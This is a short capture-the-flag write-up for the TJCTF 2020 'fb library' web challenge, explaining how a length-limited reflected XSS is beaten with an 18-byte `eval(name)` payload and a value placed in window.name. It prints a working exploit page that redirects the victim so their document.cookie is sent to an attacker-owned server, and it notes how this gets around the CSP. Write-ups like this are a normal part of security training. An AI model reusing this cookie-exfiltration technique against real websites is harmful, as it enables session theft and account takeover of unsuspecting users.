# TJCTF 2020 - fb library

The fb library challenge's application is vulnerable to reflected XSS through search queries at `https://fb_library.tjctf.org/search?q={xss}`. However, the payload has an 18 byte restriction on it as the application truncates queries longer than 18 bytes and appends `...` to them before writing to the page.

So, as `window.name` is attacker-controlled, we came up with `<script>eval(name)/*` as the payload. Thankfully, the CSP whitelisted `eval`.

All we did was simply create the following page to create an exploit page containing something along the lines of:

```html
<script>
var payload = 'window.location = "https://ourwebserver.com/exfil?cookies=" + document.cookie;';
window.open('https://fb_library.tjctf.org/search?q=%3Cscript%3Eeval(name)/*', payload);
</script>
```

...where `ourwebserver.com` is a domain we own; the CSP prevented all remote resource loading, but we can just redirect since we have JS code execution.

flags!!!!!!
